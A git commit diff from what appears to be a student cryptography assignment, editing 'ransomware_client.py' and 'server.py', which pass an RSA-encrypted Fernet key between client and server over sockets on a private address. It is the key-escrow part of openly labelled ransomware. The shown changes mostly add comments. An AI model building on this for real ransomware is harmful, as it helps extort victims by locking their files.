83641259c35fb1999bb80239cfb56052fc25dc47
Shubhp333 <shubh.123478@gmail.com>
2022-10-22 17:56:51 -0400

    completed

--- ransomware_client.py
+++ ransomware_client.py
@@ -7,9 +7,7 @@ from cryptography.hazmat.primitives import hashes
 # create a symentric key using fernet library
 symentric_key = Fernet.generate_key()
 
-# this command for save the fernet key
-# with open("thekey.key", "wb") as thekey:
-#     thekey.write(symentric_key)
+# IP and PORT number for connect to the server
 IP = "10.0.0.150"  
 PORT = 333
 
@@ -28,34 +26,34 @@ with open ("D:\conestoga\cryptography\Assignment_1\public_key.key", 'rb') as pub
 # this command encrypt symentric key using public key
     encrypted_Symmetric_Key = public_key.encrypt(symentric_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
 
+# this command save the symentric key into client system
 with open ("Encryted_symentric_key.key", 'wb') as esk:
     esk.write(encrypted_Symmetric_Key)
-
 
 # this command send encrypted symentric key to server
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.connect((IP, PORT))
     print('successfuly connected')
     s.send(encrypted_Symmetric_Key)
-    print('key sended')
+    print('key sended to server')
     s.close()
 
+# this is new port for connect to the server
 IP = "10.0.0.150"  
 PORT = 334
 
+# client received decrypted symentric in the system
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind((IP, PORT))
     s.listen(1)
     conn, addr = s.accept()
-    
     print(f'Connection from {addr} established')
 
     with conn:
         while True:
-
-            # encrypt symentric key received from clientcode
             decrypted_symentric_key = conn.recv(1024)
             break     
 
+# this command save decrypted symentric key file in  the client system
 with open ("decrypted_symentric_key.key", 'wb') as dsk:
     dsk.write(decrypted_symentric_key)
--- server.py
+++ server.py
@@ -1,9 +1,9 @@
-from email.headerregistry import Address
 import socket
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 
+# IP and PORT for connect to the client
 IP = "10.0.0.150"  
 PORT = 333  
 
@@ -14,39 +14,32 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind((IP, PORT))
     s.listen(1)
     conn, addr = s.accept()
-    
     print(f'Connection from {addr} established')
 
     with conn:
         while True:
-
-            # encrypt symentric key received from clientcode
             encrypted_symentric_key = conn.recv(1024)
             break     
 
-# this is for decryption part  
 print('connection completed and key recived')
 
-# read the private key
+# read the private key in binary form
 with open ("D:\conestoga\cryptography\Assignment_1\private_key.key", 'rb') as pb:
     pb = serialization.load_pem_private_key(pb.read(), password=None)
            
 # this command decrypt the encrypt_symentric_key using private key
 decrypted_symentric_key = pb.decrypt(encrypted_symentric_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
 
-
-# with open ("decrypted_symentric_key", 'wb') as dsk:
-#     dsk.write(decrypted_symmetric_key)
-
+# this is new port for receive connection from client
 IP = "10.0.0.150"  
 PORT = 334
 
-# this command send encrypted symentric key to server
+# server send decrypted symentric key to the client system
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.connect((IP, PORT))
     print('successfuly connected')
     s.send(decrypted_symentric_key)
-    print('key sended')
+    print('key sended to client')
     s.close()
                         
 
